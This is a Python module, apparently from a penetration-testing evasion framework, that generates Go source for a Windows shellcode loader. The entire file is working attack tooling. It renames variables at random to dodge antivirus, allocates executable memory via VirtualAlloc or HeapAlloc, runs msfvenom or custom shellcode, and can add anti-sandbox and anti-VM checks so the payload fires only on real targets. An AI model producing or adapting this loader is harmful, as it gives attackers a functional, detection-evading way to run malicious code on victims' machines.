"""

Go inline shellcode injector using the VirtualAlloc().
Uses basic variable renaming obfuscation.


Module built by @b00stfr3ak44
Updated by @ChrisTruncer

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "go"
        self.extension = "go"
        self.rating = "Normal"
        self.description = "Golang VirtualAlloc method for inline shellcode injection"
        self.name = "Golang Flat Shellcode Injector"
        self.path = "go/shellcode_inject/virtual"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "UTCCHECK"       : ["FALSE", "Check if system uses UTC time"],
            "USERPROMPT"     : ["FALSE", "Prompt user prior to injection"],
            "RAMCHECK"       : ["FALSE", "Check for at least 3 gigs of RAM"],
            "PROCCHECK"      : ["FALSE", "Check for active VM processes"],
            "MINPROCS"       : ["X", "Minimum number of running processes"],
            "BADMACS"        : ["FALSE", "Check for VM based MAC addresses"],
            "CLICKTRACK"     : ["X", "Require X number of clicks before execution"],
            "CURSORCHECK"    : ["FALSE", "Check for mouse movements"],
            "DISKSIZE"       : ["X", "Check for a minimum number of gigs for hard disk"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):

        # randomly generate out variable names
        memCommit = evasion_helpers.randomString()
        memReserve = evasion_helpers.randomString()
        pageExecRW = evasion_helpers.randomString()
        kernel32 = evasion_helpers.randomString()
        procVirtualAlloc = evasion_helpers.randomString()
        cust_func = evasion_helpers.randomString()
        size = evasion_helpers.randomString()
        addr = evasion_helpers.randomString()
        err = evasion_helpers.randomString()
        shellcode_variable = evasion_helpers.randomString()
        buff = evasion_helpers.randomString()
        value = evasion_helpers.randomString()
        heapcreatevariable = evasion_helpers.randomString()
        heapallocvariable = evasion_helpers.randomString()
        heapcreateout = evasion_helpers.randomString()
        errorvariable = evasion_helpers.randomString()
        heapallocout = evasion_helpers.randomString()
        rand_var = evasion_helpers.randomString()
        procVirtualProtect = evasion_helpers.randomString()
        proc_out = evasion_helpers.randomString()
        vprotectendvar = evasion_helpers.randomString()

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode

        # sandbox check code
        sandbox_checks, num_curlys = gamemaker.senecas_games(self)

        payload_code = "package main\nimport (\n\"syscall\"\n\"unsafe\"\n\"fmt\"\n\"os\"\n"
        if self.required_options["PROCESSORS"][0].lower() != "x":
            payload_code += "\"runtime\"\n"

        # Add in other imports based on checks being performed
        if self.required_options["USERNAME"][0].lower() != "x":
            payload_code += "\"strings\"\n\"os/user\"\n"
        if self.required_options["HOSTNAME"][0].lower() != "x" or self.required_options["PROCCHECK"][0].lower() != 'false':
            if "strings" not in payload_code:
                payload_code += "\"strings\"\n"
        if self.required_options["SLEEP"][0].lower() != "x":
            payload_code += "\"net\"\n\"time\"\n\"encoding/binary\"\n"
        if self.required_options["BADMACS"][0].lower() != 'false':
            if "net" not in payload_code:
                payload_code += "\"net\"\n"
            if "strings" not in payload_code:
                payload_code += "\"strings\"\n"
        if self.required_options["UTCCHECK"][0].lower() != 'false':
            if "time" not in payload_code:
                payload_code += "\"time\"\n"
        if self.required_options["CURSORCHECK"][0].lower() != 'false':
            if "time" not in payload_code:
                payload_code += "\"time\"\n"

        payload_code += ")\n"

        # Changes based on injection type
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "const (\n"
            payload_code += "%s  = 0x1000\n" % (memCommit)
            payload_code += "%s = 0x2000\n" % (memReserve)
            payload_code += "%s  = 0x04\n)\n" % (pageExecRW)

        payload_code += "var (\n"

        # injection type
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s = 0\n" %(proc_out)
            payload_code += "%s = syscall.NewLazyDLL(\"kernel32.dll\")\n" %(kernel32)
            payload_code += "%s = %s.NewProc(\"VirtualAlloc\")\n" %(procVirtualAlloc, kernel32)
            payload_code += "%s = %s.NewProc(\"VirtualProtect\")\n)\n" %(procVirtualProtect, kernel32)
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" %(cust_func, size)
            payload_code += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" %(addr, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += kernel32 + " = syscall.NewLazyDLL(\"kernel32.dll\")\n"
            payload_code += heapcreatevariable + " = " + kernel32 + ".NewProc(\"HeapCreate\")\n"
            payload_code += heapallocvariable + " = " + kernel32 + ".NewProc(\"HeapAlloc\")\n)\n"
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" %(cust_func, size)
            payload_code += heapcreateout + ", _, " + errorvariable + " := " + heapcreatevariable + ".Call(0x00040000, " + size + ", 0)\n"
            payload_code += heapallocout + ", _, _ := " + heapallocvariable + ".Call(" + heapcreateout + ", 0x00000008, " + size + ")\n"
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(heapallocout, errorvariable, heapallocout)

        payload_code += "var %s string = \"%s\"\n" %(shellcode_variable, Shellcode)
        payload_code += "func main() {\n"
        # Sandbox code goes here
        if sandbox_checks != '':
            payload_code += sandbox_checks

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s, %s := %s(uintptr(len(%s)))\n" %(addr, err, cust_func, shellcode_variable)
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += "%s, %s := %s(uintptr(len(%s)))\n" %(heapallocout, err, cust_func, shellcode_variable)

        payload_code += "if %s != nil {\nfmt.Println(%s)\nos.Exit(1)\n}\n" %(err, err)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, addr)
            payload_code += "var %s uintptr\n" %(proc_out)
            payload_code += "var %s uintptr\n" %(vprotectendvar)
            payload_code += "for " + rand_var + ", %s := range []byte(%s) {\n" %(value, shellcode_variable)
            payload_code += buff + "[" + rand_var + "] = %s\n}\n" % (value)
            payload_code += "%s, _, %s = %s.Call(%s, uintptr(len(%s)), 0x20, uintptr(unsafe.Pointer(&%s)))\n" %(proc_out, err, procVirtualProtect, addr, shellcode_variable, vprotectendvar)
            payload_code += "if %s == 0 {\nos.Exit(1)\n}\n" %(proc_out)
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, heapallocout)
            payload_code += "for " + rand_var + ", %s := range []byte(%s) {\n" %(value, shellcode_variable)
            payload_code += buff + "[" + rand_var + "] = %s\n}\n" % (value)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" % (addr)
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" % (heapallocout)

        payload_code += '}' * num_curlys
        self.payload_source_code = payload_code
        return
